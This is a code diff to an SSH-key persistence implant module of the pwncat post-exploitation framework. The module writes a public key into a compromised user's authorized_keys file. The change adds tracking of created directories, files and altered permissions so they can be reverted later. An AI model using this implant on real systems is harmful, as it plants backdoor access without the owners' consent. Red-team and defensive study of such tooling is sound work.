@@ -3,7 +3,7 @@ import os
 import pathlib
 
 import pwncat
-from pwncat.facts import PrivateKey
+from pwncat.facts import PrivateKey, CreatedFile, CreatedDirectory, ModifiedPermissions
 from pwncat.modules import Status, Argument, ModuleFailed
 from pwncat.platform.linux import Linux
 from pwncat.modules.implant import ImplantModule
@@ -127,10 +127,23 @@ class Module(ImplantModule):
         # Ensure the directory exists
         yield Status("locating authorized keys")
         homedir = session.platform.Path(user_info.home)
-        if not (homedir / ".ssh").is_dir():
-            (homedir / ".ssh").mkdir(parents=True, exist_ok=True)
+        sshdir = homedir / ".ssh"
 
-        authkeys_path = homedir / ".ssh" / "authorized_keys"
+        if not sshdir.is_dir():
+            sshdir.mkdir(parents=True, exist_ok=True)
+            # Register the fact that we created this directory
+            # so that we can later revert it
+            session.register_fact(CreatedDirectory(self.source, implant.uid, str(sshdir)))
+
+        # Modify the permissions if it was incorrectly set
+        permissions = sshdir.stat().st_mode
+        if permissions != 0o40700:
+            yield Status("fixing .ssh directory permissions")
+            sshdir.chmod(0o40700)
+            session.register_fact(ModifiedPermissions(self.source, implant.uid, str(sshdir), permissions))
+
+        authkeys_path = sshdir / "authorized_keys"
+        creating_authkeys = False
 
         if authkeys_path.is_file():
             try:
@@ -140,6 +153,9 @@ class Module(ImplantModule):
             except (FileNotFoundError, PermissionError) as exc:
                 raise ModuleFailed(str(exc)) from exc
         else:
+            # Since we eventually create the file, it is better
+            # to register this fact too for later reverts
+            creating_authkeys = True
             authkeys = []
 
         # Add the public key to authorized keys
@@ -149,6 +165,8 @@ class Module(ImplantModule):
             yield Status("patching authorized keys")
             with authkeys_path.open("w") as filp:
                 filp.writelines(authkeys)
+                if creating_authkeys:
+                    session.register_fact(CreatedFile(self.source, implant.uid, str(authkeys_path)))
         except (FileNotFoundError, PermissionError) as exc:
             raise ModuleFailed(str(exc)) from exc
 
